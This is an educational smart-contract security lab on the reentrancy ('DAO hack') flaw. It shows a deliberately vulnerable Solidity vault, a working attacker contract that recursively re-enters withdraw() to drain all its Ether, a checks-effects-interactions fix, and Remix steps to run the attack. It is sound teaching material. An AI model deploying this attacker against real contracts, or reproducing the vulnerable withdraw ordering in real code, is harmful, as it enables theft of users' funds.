## Lab 1: Reentrancy Attack (The "DAO" Hack)

This lab demonstrates the most famous vulnerability in smart contract history. It occurs when a contract sends Ether to an external address **before** updating its internal state.

### 1. The Vulnerable Contract

The flaw is in the **Timing**. The contract checks the balance, sends the money, and only *then* resets the balance to zero.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No funds");

        // STEP 1: INTERACTION (The money leaves)
        // This triggers the Attacker's receive() function
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send");

        // STEP 2: EFFECT (Update balance)
        // DANGER: In a reentrancy attack, we never reach this line!
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

---

### 2. The Attacker Contract

This contract acts as a "malicious mirror." When it receives money, it immediately asks for more.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }

    // This function is triggered automatically when the Vault sends ETH
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // Re-enter the withdraw function!
            vault.withdraw(); 
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send 1 ETH to start attack");
        // 1. Deposit 1 ETH so the Vault thinks we are a valid user
        vault.deposit{value: 1 ether}();
        // 2. Start the recursive loop
        vault.withdraw();
    }

    function getMyBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

---

### 3. The Fixed Contract (Industry Standard)

The fix uses the **Checks-Effects-Interactions (CEI)** pattern. By setting the balance to zero *before* sending the ETH, any re-entry attempt will fail the `require(bal > 0)` check.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FixedVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // 1. CHECKS
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No funds");

        // 2. EFFECTS (Update state FIRST)
        balances[msg.sender] = 0;

        // 3. INTERACTIONS (External call LAST)
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send");
    }
}

```

---

### 📋 Full Execution Steps (Remix)

1. **Preparation**: In the **Deploy & Run** tab, ensure you have multiple accounts with 100 ETH.
2. **Deploy Vault**: Select `VulnerableVault` and deploy using **Account 1**.
3. **Fund Vault**: Using **Account 1**, set "Value" to **10 ETH** and click `deposit`.
4. **Deploy Attacker**: Switch to **Account 2**. Copy the Vault's address. Paste it into the `Attacker` deploy field and click "Deploy."
5. **The Attack**: In the `Attacker` contract menu, set "Value" to **1 ETH** and click `attack`.
6. **Verify**:
* Click `getBalance` on the Vault: It should be **0**.
* Click `getMyBalance` on the Attacker: It should be **11 ETH**.

7. **Test the Fix**: Deploy `FixedVault` and repeat. The transaction will fail/revert because the attacker can no longer re-enter.
